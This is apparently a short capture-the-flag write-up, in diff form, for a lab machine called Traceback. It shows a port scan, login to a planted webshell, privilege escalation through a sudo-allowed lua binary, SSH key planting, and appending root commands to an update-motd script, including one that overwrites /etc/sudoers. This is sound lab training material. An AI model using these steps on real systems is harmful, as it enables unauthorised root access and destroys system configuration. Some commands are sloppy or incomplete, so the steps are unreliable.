@@ -1,0 +1,42 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Help us
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---WEBSHELL---
+found a webshell already injected in the page but no privilege escalation happend
+smevk.php admin/admin
+*sudo -l
+User webadmin may run the following commands on traceback:
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+running a bash inside lua
+sysadmin level accquired
+linPEAS found /etc/update-motd.d/* executable files
+webadmin user can write into .ssh/authorized_keys
+creating a local ssh key
+*ssh-keygen
+echoing this key into /home/webadmin/.ssh/authorized_keys and logging in
+*ssh webadmin@10.10.10.181
+writing "cat /root/root.txt" into 00-header file on /etc/update-motd.d/
+*echo "cat /root/root.txt" >> /etc/update-motd.d/00-header
+*ssh webadmin@10.10.10.181
+to login again and 00-header will be executed and return the flag
+
+---GETTING ROOT ACCES---
+on target machine:
+*echo "passwd -d webadmin"
+*echo "echo \"webadmin ALL=(ALL:ALL)  ALL\" > /etc/sudoers" >> 00-header
+loggin with ssh
+*ssh webadmin@10.10.10.181
+create new passwd
+*passwd
+loggin with
+*sudo su
+root level access gained
